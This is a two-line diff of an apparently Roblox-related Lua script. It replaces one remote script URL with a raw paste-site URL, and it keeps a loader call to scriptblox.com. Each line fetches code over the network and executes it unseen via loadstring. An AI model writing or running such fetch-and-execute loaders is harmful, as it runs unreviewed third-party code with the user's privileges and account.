@@ -1,2 +1,2 @@
 pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_96f1c9235ebb", "1.0.0", false) end)
-loadstring(game:HttpGet("https://vxezestudio.online/api/scripts/script_2STcec8eMRciW/stream/init"))()
+loadstring(game:HttpGet("https://pastefy.app/iPQFTtv4/raw"))()
